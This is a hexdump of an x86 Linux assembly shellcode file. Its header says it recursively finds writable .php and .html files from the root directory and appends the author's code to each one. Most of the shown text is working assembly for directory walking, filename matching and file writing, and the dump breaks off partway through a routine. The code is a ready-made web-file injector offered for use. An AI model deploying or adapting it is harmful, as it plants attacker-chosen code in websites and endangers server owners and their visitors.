00000000  3b 20 54 69 74 6c 65 20  3a 20 4c 69 6e 75 78 2f  |; Title : Linux/|
00000010  78 38 36 20 53 65 61 72  63 68 20 70 68 70 2c 68  |x86 Search php,h|
00000020  74 6d 6c 20 77 72 69 74  61 62 6c 65 20 66 69 6c  |tml writable fil|
00000030  65 73 20 61 6e 64 20 61  64 64 20 79 6f 75 72 20  |es and add your |
00000040  63 6f 64 65 2e 0d 0a 3b  20 44 61 74 65 20 20 3a  |code...; Date  :|
00000050  20 32 30 31 31 2d 31 30  2d 32 34 20 0d 0a 3b 20  | 2011-10-24 ..; |
00000060  41 75 74 68 6f 72 3a 20  72 69 67 61 6e 20 2d 20  |Author: rigan - |
00000070  69 6d 72 69 67 61 6e 20  5b 73 6f 62 61 63 68 6b  |imrigan [sobachk|
00000080  61 20 5d 20 67 6d 61 69  6c 2e 63 6f 6d 0d 0a 3b  |a ] gmail.com..;|
00000090  20 53 69 7a 65 20 20 3a  20 33 38 30 20 62 79 74  | Size  : 380 byt|
000000a0  65 73 20 2b 20 79 6f 75  72 20 63 6f 64 65 2e 0d  |es + your code..|
000000b0  0a 3b 0d 0a 3b 20 4e 6f  74 65 20 20 3a 20 54 68  |.;..; Note  : Th|
000000c0  69 73 20 73 68 65 6c 6c  63 6f 64 65 20 77 72 69  |is shellcode wri|
000000d0  74 65 73 20 64 6f 77 6e  20 79 6f 75 72 20 63 6f  |tes down your co|
000000e0  64 65 20 69 6e 20 74 68  65 20 65 6e 64 20 6f 66  |de in the end of|
000000f0  20 0d 0a 3b 20 20 20 20  20 20 20 20 20 66 6f 75  | ..;         fou|
00000100  6e 64 20 66 69 6c 65 73  2e 20 59 6f 75 72 20 63  |nd files. Your c|
00000110  6f 64 65 20 77 69 6c 6c  20 62 65 20 61 64 64 65  |ode will be adde|
00000120  64 20 6f 6e 6c 79 20 2e  68 74 6d 6c 20 61 6e 64  |d only .html and|
00000130  20 2e 70 68 70 20 0d 0a  3b 20 20 20 20 20 20 20  | .php ..;       |
00000140  20 20 66 69 6c 65 73 2e  20 53 65 61 72 63 68 20  |  files. Search |
00000150  66 6f 72 20 66 69 6c 65  73 20 69 73 20 63 61 72  |for files is car|
00000160  72 69 65 64 20 6f 75 74  20 72 65 63 75 72 73 69  |ried out recursi|
00000170  76 65 6c 79 2e 20 20 0d  0a 0d 0a 20 0d 0a 0d 0a  |vely.  .... ....|
00000180  42 49 54 53 20 33 32 0d  0a 0d 0a 73 65 63 74 69  |BITS 32....secti|
00000190  6f 6e 20 2e 74 65 78 74  0d 0a 67 6c 6f 62 61 6c  |on .text..global|
000001a0  20 5f 73 74 61 72 74 0d  0a 5f 73 74 61 72 74 3a  | _start.._start:|
000001b0  0d 0a 3b 3d 3d 3d 3d 3d  3d 3d 3d 3d 3d 3d 3d 3d  |..;=============|
000001c0  3d 3d 3d 3d 3d 3d 3d 3d  3d 3d 3d 3d 3d 3d 3d 3d  |================|
*
000001f0  3d 3d 3d 3d 3d 3d 3d 3d  3d 3b 0d 0a 3b 20 20 20  |=========;..;   |
00000200  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000210  20 20 20 20 20 20 20 20  20 20 20 20 6d 61 69 6e  |            main|
00000220  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
*
00000240  20 20 20 3b 0d 0a 3b 3d  3d 3d 3d 3d 3d 3d 3d 3d  |   ;..;=========|
00000250  3d 3d 3d 3d 3d 3d 3d 3d  3d 3d 3d 3d 3d 3d 3d 3d  |================|
*
00000280  3d 3d 3d 3d 3d 3d 3d 3d  3d 3d 3d 3d 3d 3b 0d 0a  |=============;..|
00000290  20 20 20 20 20 20 20 20  20 20 20 20 20 20 3b 20  |              ; |
000002a0  63 68 64 69 72 28 22 2f  22 29 20 20 0d 0a 20 20  |chdir("/")  ..  |
000002b0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 78 6f  |              xo|
000002c0  72 20 65 61 78 2c 20 65  61 78 0d 0a 20 20 20 20  |r eax, eax..    |
000002d0  20 20 20 20 20 20 20 20  20 20 20 20 70 75 73 68  |            push|
000002e0  20 65 61 78 0d 0a 20 20  20 20 20 20 20 20 20 20  | eax..          |
000002f0  20 20 20 20 20 20 73 75  62 20 65 73 70 2c 20 42  |      sub esp, B|
00000300  59 54 45 20 30 78 31 0d  0a 20 20 20 20 20 20 20  |YTE 0x1..       |
00000310  20 20 20 20 20 20 20 20  20 6d 6f 76 20 42 59 54  |         mov BYT|
00000320  45 20 5b 65 73 70 5d 2c  20 30 78 32 66 0d 0a 20  |E [esp], 0x2f.. |
00000330  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 6d  |               m|
00000340  6f 76 20 65 62 78 2c 20  65 73 70 0d 0a 20 20 20  |ov ebx, esp..   |
00000350  20 20 20 20 20 20 20 20  20 20 20 20 20 6d 6f 76  |             mov|
00000360  20 61 6c 2c 20 31 32 0d  0a 20 20 20 20 20 20 20  | al, 12..       |
00000370  20 20 20 20 20 20 20 20  20 69 6e 74 20 30 78 38  |         int 0x8|
00000380  30 0d 0a 20 20 20 20 20  20 20 20 20 20 20 20 0d  |0..            .|
00000390  0a 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |.               |
000003a0  20 78 6f 72 20 65 61 78  2c 20 65 61 78 0d 0a 20  | xor eax, eax.. |
000003b0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 70  |               p|
000003c0  75 73 68 20 65 61 78 0d  0a 20 20 20 20 20 20 20  |ush eax..       |
000003d0  20 20 20 20 20 20 20 20  20 73 75 62 20 65 73 70  |         sub esp|
000003e0  2c 20 42 59 54 45 20 30  78 31 0d 0a 20 20 20 20  |, BYTE 0x1..    |
000003f0  20 20 20 20 20 20 20 20  20 20 20 20 6d 6f 76 20  |            mov |
00000400  42 59 54 45 20 5b 65 73  70 5d 2c 20 30 78 32 65  |BYTE [esp], 0x2e|
00000410  0d 0a 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |..              |
00000420  20 0d 0a 20 20 20 20 20  20 20 20 20 20 20 20 20  | ..             |
00000430  20 20 20 6a 6d 70 20 53  48 4f 52 54 20 2e 65 78  |   jmp SHORT .ex|
00000440  69 74 0d 0a 0d 0a 2e 6a  6d 70 5f 73 65 61 72 63  |it.....jmp_searc|
00000450  68 3a 20 0d 0a 20 20 20  20 20 20 20 20 20 20 20  |h: ..           |
00000460  20 20 20 20 20 6a 6d 70  20 53 48 4f 52 54 20 73  |     jmp SHORT s|
00000470  65 61 72 63 68 20 20 20  20 20 20 0d 0a 0d 0a 2e  |earch      .....|
00000480  65 78 69 74 3a 0d 0a 20  20 20 20 20 20 20 20 20  |exit:..         |
00000490  20 20 20 20 20 20 20 63  61 6c 6c 20 2e 6a 6d 70  |       call .jmp|
000004a0  5f 73 65 61 72 63 68 0d  0a 20 20 20 20 20 20 20  |_search..       |
000004b0  20 20 0d 0a 20 20 20 20  20 20 20 20 20 20 20 20  |  ..            |
000004c0  20 20 3b 20 65 78 69 74  28 30 29 20 20 20 0d 0a  |  ; exit(0)   ..|
000004d0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000004e0  78 6f 72 20 65 61 78 2c  20 65 61 78 0d 0a 20 20  |xor eax, eax..  |
000004f0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 78 6f  |              xo|
00000500  72 20 65 62 78 2c 20 65  62 78 0d 0a 20 20 20 20  |r ebx, ebx..    |
00000510  20 20 20 20 20 20 20 20  20 20 20 20 6d 6f 76 20  |            mov |
00000520  61 6c 2c 20 31 0d 0a 20  20 20 20 20 20 20 20 20  |al, 1..         |
00000530  20 20 20 20 20 20 20 69  6e 74 20 30 78 38 30 0d  |       int 0x80.|
00000540  0a 0d 0a 3b 3d 3d 3d 3d  3d 3d 3d 3d 3d 3d 3d 3d  |...;============|
00000550  3d 3d 3d 3d 3d 3d 3d 3d  3d 3d 3d 3d 3d 3d 3d 3d  |================|
*
00000580  3d 3d 3d 3d 3d 3d 3d 3d  3d 3d 3b 0d 0a 3b 20 20  |==========;..;  |
00000590  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000005a0  20 20 20 20 20 20 20 20  20 20 20 20 20 69 6e 6a  |             inj|
000005b0  65 63 74 20 20 20 20 20  20 20 20 20 20 20 20 20  |ect             |
000005c0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000005d0  20 20 20 20 3b 0d 0a 3b  3d 3d 3d 3d 3d 3d 3d 3d  |    ;..;========|
000005e0  3d 3d 3d 3d 3d 3d 3d 3d  3d 3d 3d 3d 3d 3d 3d 3d  |================|
*
00000610  3d 3d 3d 3d 3d 3d 3d 3d  3d 3d 3d 3d 3d 3d 3b 0d  |==============;.|
00000620  0a 69 6e 6a 65 63 74 3a  0d 0a 20 20 20 20 20 20  |.inject:..      |
00000630  20 20 20 20 20 20 20 20  20 3b 20 6f 70 65 6e 28  |         ; open(|
00000640  22 66 69 6c 65 22 2c 20  4f 5f 57 52 4f 4e 4c 59  |"file", O_WRONLY|
00000650  29 0d 0a 20 20 20 20 20  20 20 20 20 20 20 20 20  |)..             |
00000660  20 20 20 78 6f 72 20 65  61 78 2c 20 65 61 78 0d  |   xor eax, eax.|
00000670  0a 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |.               |
00000680  20 6d 6f 76 20 65 62 78  2c 20 65 64 69 0d 0a 20  | mov ebx, edi.. |
00000690  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 78  |               x|
000006a0  6f 72 20 65 63 78 2c 20  65 63 78 0d 0a 20 20 20  |or ecx, ecx..   |
000006b0  20 20 20 20 20 20 20 20  20 20 20 20 20 6d 6f 76  |             mov|
000006c0  20 63 6c 2c 20 32 0d 0a  20 20 20 20 20 20 20 20  | cl, 2..        |
000006d0  20 20 20 20 20 20 20 20  6d 6f 76 20 61 6c 2c 20  |        mov al, |
000006e0  35 0d 0a 20 20 20 20 20  20 20 20 20 20 20 20 20  |5..             |
000006f0  20 20 20 69 6e 74 20 30  78 38 30 0d 0a 20 20 20  |   int 0x80..   |
00000700  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
*
00000720  20 20 20 20 20 20 20 20  20 20 20 20 0d 0a 20 20  |            ..  |
00000730  20 20 20 20 20 20 20 20  20 20 20 20 3b 20 6c 73  |            ; ls|
00000740  65 65 6b 28 66 64 2c 20  30 2c 20 53 45 45 4b 5f  |eek(fd, 0, SEEK_|
00000750  45 4e 44 29 0d 0a 20 20  20 20 20 20 20 20 20 20  |END)..          |
00000760  20 20 20 20 20 20 78 6f  72 20 65 62 78 2c 20 65  |      xor ebx, e|
00000770  62 78 0d 0a 20 20 20 20  20 20 20 20 20 20 20 20  |bx..            |
00000780  20 20 20 20 6d 6f 76 20  65 62 78 2c 20 65 61 78  |    mov ebx, eax|
00000790  0d 0a 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |..              |
000007a0  20 20 78 6f 72 20 65 63  78 2c 20 65 63 78 0d 0a  |  xor ecx, ecx..|
000007b0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000007c0  78 6f 72 20 65 61 78 2c  20 65 61 78 0d 0a 20 20  |xor eax, eax..  |
000007d0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 63 64  |              cd|
000007e0  71 0d 0a 20 20 20 20 20  20 20 20 20 20 20 20 20  |q..             |
000007f0  20 20 20 6d 6f 76 20 64  6c 2c 20 32 0d 0a 20 20  |   mov dl, 2..  |
00000800  20 20 20 20 20 20 20 20  20 20 20 20 20 20 6d 6f  |              mo|
00000810  76 20 61 6c 2c 20 31 39  0d 0a 20 20 20 20 20 20  |v al, 19..      |
00000820  20 20 20 20 20 20 20 20  20 20 69 6e 74 20 30 78  |          int 0x|
00000830  38 30 0d 0a 20 20 20 20  0d 0a 20 20 20 20 20 20  |80..    ..      |
00000840  20 20 20 20 20 20 20 20  3b 20 77 72 69 74 65 28  |        ; write(|
00000850  66 64 2c 20 79 6f 75 72  5f 63 6f 64 65 2c 20 73  |fd, your_code, s|
00000860  69 7a 65 6f 66 28 79 6f  75 72 5f 63 6f 64 65 29  |izeof(your_code)|
00000870  29 20 20 0d 0a 20 20 20  20 20 20 20 20 20 20 20  |)  ..           |
00000880  20 20 20 20 20 78 6f 72  20 65 61 78 2c 20 65 61  |     xor eax, ea|
00000890  78 0d 0a 20 20 20 20 20  20 20 20 20 20 20 20 20  |x..             |
000008a0  20 20 20 6d 6f 76 20 65  63 78 2c 20 65 73 69 0d  |   mov ecx, esi.|
000008b0  0a 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |.               |
000008c0  20 6d 6f 76 20 64 6c 2c  20 34 33 20 20 20 3b 20  | mov dl, 43   ; |
000008d0  3c 2d 20 54 4f 20 43 48  41 4e 47 45 20 54 48 45  |<- TO CHANGE THE|
000008e0  20 53 49 5a 45 20 48 45  52 45 2e 0d 0a 20 20 20  | SIZE HERE...   |
000008f0  20 20 20 20 20 20 20 20  20 20 20 20 20 6d 6f 76  |             mov|
00000900  20 61 6c 2c 20 34 0d 0a  20 20 20 20 20 20 20 20  | al, 4..        |
00000910  20 20 20 20 20 20 20 20  69 6e 74 20 30 78 38 30  |        int 0x80|
00000920  20 0d 0a 0d 0a 20 20 20  20 20 20 20 20 20 20 20  | ....           |
00000930  20 20 20 3b 20 63 6c 6f  73 65 28 66 64 29 0d 0a  |   ; close(fd)..|
00000940  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000950  78 6f 72 20 65 61 78 2c  20 65 61 78 0d 0a 20 20  |xor eax, eax..  |
00000960  20 20 20 20 20 20 20 20  20 20 20 20 20 20 78 6f  |              xo|
00000970  72 20 65 62 78 2c 20 65  62 78 0d 0a 20 20 20 20  |r ebx, ebx..    |
00000980  20 20 20 20 20 20 20 20  20 20 20 20 6d 6f 76 20  |            mov |
00000990  61 6c 2c 20 36 0d 0a 20  20 20 20 20 20 20 20 20  |al, 6..         |
000009a0  20 20 20 20 20 20 20 69  6e 74 20 30 78 38 30 20  |       int 0x80 |
000009b0  0d 0a 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |..              |
*
000009d0  20 20 72 65 74 0d 0a 20  20 20 20 20 20 20 20 20  |  ret..         |
000009e0  20 20 20 20 20 20 20 0d  0a 3b 3d 3d 3d 3d 3d 3d  |       ..;======|
000009f0  3d 3d 3d 3d 3d 3d 3d 3d  3d 3d 3d 3d 3d 3d 3d 3d  |================|
*
00000a30  3b 0d 0a 3b 20 20 20 20  20 20 20 20 20 20 20 20  |;..;            |
00000a40  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000a50  20 20 20 73 75 62 73 74  72 20 20 20 20 20 20 20  |   substr       |
00000a60  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000a70  20 20 20 20 20 20 20 20  20 20 3b 0d 0a 3b 3d 3d  |          ;..;==|
00000a80  3d 3d 3d 3d 3d 3d 3d 3d  3d 3d 3d 3d 3d 3d 3d 3d  |================|
*
00000ac0  3d 3d 3d 3d 3b 0d 0a 20  20 20 20 20 20 20 20 0d  |====;..        .|
00000ad0  0a 73 75 62 73 74 72 3a  20 20 20 20 20 20 20 0d  |.substr:       .|
00000ae0  0a 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |.               |
00000af0  20 78 6f 72 20 65 61 78  2c 20 65 61 78 0d 0a 20  | xor eax, eax.. |
00000b00  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 78  |               x|
00000b10  6f 72 20 65 62 78 2c 20  65 62 78 0d 0a 20 20 20  |or ebx, ebx..   |
00000b20  20 20 20 20 20 20 20 20  20 20 20 20 20 78 6f 72  |             xor|
00000b30  20 65 63 78 2c 20 65 63  78 0d 0a 20 20 20 20 20  | ecx, ecx..     |
00000b40  20 20 20 20 20 20 20 20  20 20 20 63 64 71 0d 0a  |           cdq..|
00000b50  0d 0a 6c 6f 6f 70 5f 31  3a 20 0d 0a 20 20 20 20  |..loop_1: ..    |
00000b60  20 20 20 20 20 20 20 20  20 20 20 20 69 6e 63 20  |            inc |
00000b70  65 64 78 0d 0a 20 20 20  20 20 20 20 20 20 20 20  |edx..           |
00000b80  20 20 20 20 20 0d 0a 20  20 20 20 20 20 20 20 20  |     ..         |
00000b90  20 20 20 20 20 3b 20 65  64 69 20 63 6f 6e 74 61  |     ; edi conta|
00000ba0  69 6e 73 20 74 68 65 20  66 69 6c 65 6e 61 6d 65  |ins the filename|
00000bb0  20 61 64 64 72 65 73 73  0d 0a 20 20 20 20 20 20  | address..      |
00000bc0  20 20 20 20 20 20 20 20  3b 20 65 73 69 20 63 6f  |        ; esi co|
00000bd0  6e 74 61 69 6e 73 20 74  68 65 20 73 75 62 73 74  |ntains the subst|
00000be0  72 69 6e 67 20 61 64 64  72 65 73 73 20 0d 0a 20  |ring address .. |
00000bf0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 6d  |               m|
00000c00  6f 76 20 42 59 54 45 20  62 6c 2c 20 5b 65 64 69  |ov BYTE bl, [edi|
00000c10  20 2b 20 65 64 78 5d 20  0d 0a 20 20 20 20 20 20  | + edx] ..      |
00000c20  20 20 0d 0a 20 20 20 20  20 20 20 20 20 20 20 20  |  ..            |
00000c30  20 20 20 20 74 65 73 74  20 62 6c 2c 20 62 6c 20  |    test bl, bl |
00000c40  0d 0a 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |..              |
00000c50  20 20 6a 7a 20 6e 6f 74  5f 66 6f 75 6e 64 0d 0a  |  jz not_found..|
00000c60  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000c70  0d 0a 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |..              |
00000c80  20 20 63 6d 70 20 42 59  54 45 20 62 6c 2c 20 5b  |  cmp BYTE bl, [|
00000c90  65 73 69 5d 20 20 20 20  20 20 20 20 0d 0a 20 20  |esi]        ..  |
00000ca0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 6a 6e  |              jn|
00000cb0  65 20 6c 6f 6f 70 5f 31  20 20 20 20 20 20 20 20  |e loop_1        |
00000cc0  0d 0a 0d 0a 6c 6f 6f 70  5f 32 3a 20 20 20 20 20  |....loop_2:     |
00000cd0  20 20 20 0d 0a 20 20 20  20 20 20 20 20 20 20 20  |   ..           |
00000ce0  20 20 20 20 20 6d 6f 76  20 42 59 54 45 20 61 6c  |     mov BYTE al|
00000cf0  2c 20 5b 65 73 69 20 2b  20 65 63 78 5d 0d 0a 20  |, [esi + ecx].. |
00000d00  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 6d  |               m|
00000d10  6f 76 20 42 59 54 45 20  62 6c 2c 20 5b 65 64 69  |ov BYTE bl, [edi|
00000d20  20 2b 20 65 64 78 5d 0d  0a 20 20 20 20 20 20 20  | + edx]..       |
00000d30  20 0d 0a 20 20 20 20 20  20 20 20 20 20 20 20 20  | ..             |
00000d40  20 20 20 74 65 73 74 20  61 6c 2c 20 61 6c 0d 0a  |   test al, al..|
00000d50  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000d60  6a 7a 20 66 6f 75 6e 64  0d 0a 20 20 20 20 20 20  |jz found..      |
00000d70  20 20 0d 0a 20 20 20 20  20 20 20 20 20 20 20 20  |  ..            |
00000d80  20 20 20 20 69 6e 63 20  65 63 78 0d 0a 20 20 20  |    inc ecx..   |
00000d90  20 20 20 20 20 0d 0a 20  20 20 20 20 20 20 20 20  |     ..         |
00000da0  20 20 20 20 20 20 20 69  6e 63 20 65 64 78 0d 0a  |       inc edx..|
00000db0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000dc0  63 6d 70 20 62 6c 2c 20  61 6c 0d 0a 20 20 20 20  |cmp bl, al..    |
00000dd0  20 20 20 0d 0a 20 20 20  20 20 20 20 20 20 20 20  |   ..           |
00000de0  20 20 20 20 20 6a 65 20  6c 6f 6f 70 5f 32 0d 0a  |     je loop_2..|
00000df0  20 20 20 20 20 20 20 20  0d 0a 20 20 20 20 20 20  |        ..      |
00000e00  20 20 20 20 20 20 20 20  20 20 6a 6d 70 20 73 68  |          jmp sh|
00000e10  6f 72 74 20 6e 6f 74 5f  66 6f 75 6e 64 0d 0a 0d  |ort not_found...|
00000e20  0a 66 6f 75 6e 64 3a 0d  0a 20 20 20 20 20 20 20  |.found:..       |
00000e30  20 20 20 20 20 20 20 20  20 78 6f 72 20 65 61 78  |         xor eax|
00000e40  2c 20 65 61 78 0d 0a 20  20 20 20 20 20 20 20 20  |, eax..         |
00000e50  20 20 20 20 20 20 20 6d  6f 76 20 61 6c 2c 20 32  |       mov al, 2|
00000e60  0d 0a 20 20 20 20 20 20  20 20 0d 0a 6e 6f 74 5f  |..        ..not_|
00000e70  66 6f 75 6e 64 3a 0d 0a  20 20 20 20 20 20 20 20  |found:..        |
00000e80  20 20 20 20 20 20 20 0d  0a 20 20 20 20 20 20 20  |       ..       |
00000e90  20 20 20 20 20 20 20 20  20 72 65 74 0d 0a 20 20  |         ret..  |
00000ea0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 0d 0a  |              ..|
00000eb0  3b 3d 3d 3d 3d 3d 3d 3d  3d 3d 3d 3d 3d 3d 3d 3d  |;===============|
00000ec0  3d 3d 3d 3d 3d 3d 3d 3d  3d 3d 3d 3d 3d 3d 3d 3d  |================|
*
00000ef0  3d 3d 3d 3d 3d 3d 3d 3b  0d 0a 3b 20 20 20 20 20  |=======;..;     |
00000f00  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000f10  20 20 20 20 20 20 20 20  20 20 73 65 61 72 63 68  |          search|
00000f20  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
*
00000f40  20 3b 0d 0a 3b 3d 3d 3d  3d 3d 3d 3d 3d 3d 3d 3d  | ;..;===========|
00000f50  3d 3d 3d 3d 3d 3d 3d 3d  3d 3d 3d 3d 3d 3d 3d 3d  |================|
*
00000f80  3d 3d 3d 3d 3d 3d 3d 3d  3d 3d 3d 3b 0d 0a 3b 54  |===========;..;T|
00000f90  68 69 73 20 66 75 6e 63  74 69 6f 6e 20 72 65 63  |his function rec|
00000fa0  75 72 73 69 76 65 6c 79  20 66 69 6e 64 20 61 6c  |ursively find al|
00000fb0  6c 20 77 72 69 74 61 62  6c 65 20 66 69 6c 65 73  |l writable files|
00000fc0  2e 20 5b 70 68 70 2c 20  68 74 6d 6c 5d 0d 0a 73  |. [php, html]..s|
00000fd0  65 61 72 63 68 3a 0d 0a  20 20 20 20 20 20 20 20  |earch:..        |
00000fe0  20 20 20 20 20 20 20 20  70 75 73 68 20 65 62 70  |        push ebp|
00000ff0  0d 0a 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |..              |
00001000  20 20 6d 6f 76 20 65 62  70 2c 20 65 73 70 0d 0a  |  mov ebp, esp..|
00001010  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00001020  0d 0a 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |..              |
00001030  20 20 0d 0a 20 20 20 20  20 20 20 20 20 20 20 20  |  ..            |
00001040  20 20 20 20 6d 6f 76 20  61 6c 2c 20 32 35 30 0d  |    mov al, 250.|
00001050  0a 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |.               |
00001060  20 73 75 62 20 65 73 70  2c 20 65 61 78 0d 0a 20  | sub esp, eax.. |
00001070  20 20 20 20 20 20 20 20  20 20 20 20 20 20 0d 0a  |              ..|
00001080  20 20 20 20 20 20 20 20  20 20 20 20 20 20 3b 20  |              ; |
00001090  6f 70 65 6e 28 22 2e 22  2c 20 4f 5f 57 52 4f 4e  |open(".", O_WRON|
000010a0  4c 59 29 0d 0a 20 20 20  20 20 20 20 20 20 20 20  |LY)..           |
000010b0  20 20 20 20 20 78 6f 72  20 65 61 78 2c 20 65 61  |     xor eax, ea|
000010c0  78 0d 0a 20 20 20 20 20  20 20 20 20 20 20 20 20  |x..             |
000010d0  20 20 20 78 6f 72 20 65  63 78 2c 20 65 63 78 0d  |   xor ecx, ecx.|
000010e0  0a 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |.               |
000010f0  20 6c 65 61 20 65 62 78  2c 20 5b 65 62 70 20 2b  | lea ebx, [ebp +|
00001100  20 38 5d 0d 0a 20 20 20  20 20 20 20 20 20 20 20  | 8]..           |
00001110  20 20 20 20 20 6d 6f 76  20 61 6c 2c 20 35 0d 0a  |     mov al, 5..|
00001120  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00001130  69 6e 74 20 30 78 38 30  0d 0a 20 20 20 20 20 20  |int 0x80..      |
00001140  20 20 20 0d 0a 20 20 20  20 20 20 20 20 20 20 20  |   ..           |
00001150  20 20 20 20 20 74 65 73  74 20 65 61 78 2c 20 65  |     test eax, e|
00001160  61 78 0d 0a 20 20 20 20  20 20 20 20 20 20 20 20  |ax..            |
00001170  20 20 20 20 6a 73 20 2e  6f 6c 64 5f 64 69 72 65  |    js .old_dire|
00001180  6e 74 0d 0a 20 20 20 20  20 20 0d 0a 20 20 20 20  |nt..      ..    |
00001190  20 20 20 20 20 20 20 20  20 20 20 20 6d 6f 76 20  |            mov |
000011a0  5b 65 62 70 20 2b 20 31  32 5d 2c 20 65 61 78 20  |[ebp + 12], eax |
000011b0  20 20 20 0d 0a 0d 0a 2e  77 68 69 6c 65 3a 0d 0a  |   .....while:..|
000011c0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 3b 20  |              ; |
000011d0  72 65 61 64 64 69 72 28  66 64 2c 20 73 74 72 75  |readdir(fd, stru|
000011e0  63 74 20 6f 6c 64 5f 6c  69 6e 75 78 5f 64 69 72  |ct old_linux_dir|
000011f0  65 6e 74 20 2a 64 69 72  70 2c 20 4e 55 4c 4c 29  |ent *dirp, NULL)|
00001200  0d 0a 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |..              |
00001210  20 20 6d 6f 76 20 65 73  69 2c 20 5b 65 62 70 20  |  mov esi, [ebp |
00001220  2b 20 31 32 5d 0d 0a 20  20 20 20 20 20 20 20 20  |+ 12]..         |
00001230  20 20 20 20 20 20 20 6d  6f 76 20 65 62 78 2c 20  |       mov ebx, |
00001240  65 73 69 0d 0a 20 20 20  20 20 20 20 20 20 20 20  |esi..           |
00001250  20 20 20 20 20 78 6f 72  20 65 61 78 2c 20 65 61  |     xor eax, ea|
00001260  78 0d 0a 20 20 20 20 20  20 20 20 20 20 20 20 20  |x..             |
00001270  20 20 20 78 6f 72 20 65  63 78 2c 20 65 63 78 0d  |   xor ecx, ecx.|
00001280  0a 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |.               |
00001290  20 6c 65 61 20 65 63 78  2c 20 5b 65 73 70 20 2b  | lea ecx, [esp +|
000012a0  20 31 30 30 5d 0d 0a 20  20 20 20 20 20 20 20 20  | 100]..         |
000012b0  20 20 20 20 20 20 20 6d  6f 76 20 61 6c 2c 20 38  |       mov al, 8|
000012c0  39 0d 0a 20 20 20 20 20  20 20 20 20 20 20 20 20  |9..             |
000012d0  20 20 20 69 6e 74 20 30  78 38 30 0d 0a 20 20 20  |   int 0x80..   |
000012e0  20 20 20 20 20 20 0d 0a  20 20 20 20 20 20 20 20  |      ..        |
000012f0  20 20 20 20 20 20 20 20  74 65 73 74 20 65 61 78  |        test eax|
00001300  2c 20 65 61 78 0d 0a 20  20 20 20 20 20 20 20 20  |, eax..         |
00001310  20 20 20 20 20 20 20 6a  6e 7a 20 2e 6c 31 0d 0a  |       jnz .l1..|
00001320  0d 0a 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |..              |
00001330  3b 20 63 6c 6f 73 65 64  69 72 28 66 64 29 0d 0a  |; closedir(fd)..|
00001340  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00001350  78 6f 72 20 65 61 78 2c  20 65 61 78 0d 0a 20 20  |xor eax, eax..  |
00001360  20 20 20 20 20 20 20 20  20 20 20 20 20 20 78 6f  |              xo|
00001370  72 20 65 62 78 2c 20 65  62 78 0d 0a 20 20 20 20  |r ebx, ebx..    |
00001380  20 20 20 20 20 20 20 20  20 20 20 20 6d 6f 76 20  |            mov |
00001390  65 62 78 2c 20 65 73 69  0d 0a 20 20 20 20 20 20  |ebx, esi..      |
000013a0  20 20 20 20 20 20 20 20  20 20 6d 6f 76 20 61 6c  |          mov al|
000013b0  2c 20 36 0d 0a 20 20 20  20 20 20 20 20 20 20 20  |, 6..           |
000013c0  20 20 20 20 20 69 6e 74  20 30 78 38 30 0d 0a 0d  |     int 0x80...|
000013d0  0a 2e 6f 6c 64 5f 64 69  72 65 6e 74 3a 20 20 20  |..old_dirent:   |
000013e0  20 20 20 20 20 20 0d 0a  20 20 20 20 20 20 20 20  |      ..        |
000013f0  20 20 20 20 20 20 3b 20  63 68 64 69 72 28 22 2e  |      ; chdir(".|
00001400  2e 22 29 0d 0a 20 20 20  20 20 20 20 20 20 20 20  |.")..           |
00001410  20 20 20 20 20 78 6f 72  20 65 61 78 2c 20 65 61  |     xor eax, ea|
00001420  78 0d 0a 20 20 20 20 20  20 20 20 20 20 20 20 20  |x..             |
00001430  20 20 20 70 75 73 68 20  65 61 78 0d 0a 20 20 20  |   push eax..   |
00001440  20 20 20 20 20 20 20 20  20 20 20 20 20 70 75 73  |             pus|
00001450  68 20 57 4f 52 44 20 30  78 32 65 32 65 0d 0a 20  |h WORD 0x2e2e.. |
00001460  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 6d  |               m|
